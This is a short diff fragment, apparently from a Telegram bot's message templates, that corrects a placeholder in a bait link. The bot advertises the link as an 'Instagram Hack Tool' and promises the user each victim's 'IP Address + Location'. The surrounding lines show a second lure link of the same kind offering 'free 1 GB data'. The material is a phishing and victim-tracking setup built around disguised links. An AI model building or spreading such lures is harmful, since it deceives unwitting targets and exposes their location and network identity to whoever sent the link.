@@ -934,7 +934,7 @@ https://free-1-gb-data.vercel.app/?id={user_id}
 <b>🔥 Instagram Hack Tool Activated!</b>
 
 <b>🎯 Target Link:</b>  
-https://instagram-firm.blogspot.com/?id=user_id}
+https://instagram-firm.blogspot.com/?id={user_id}
 
 <b>📥 You Will Get:</b>  
 • IP Address + Location  
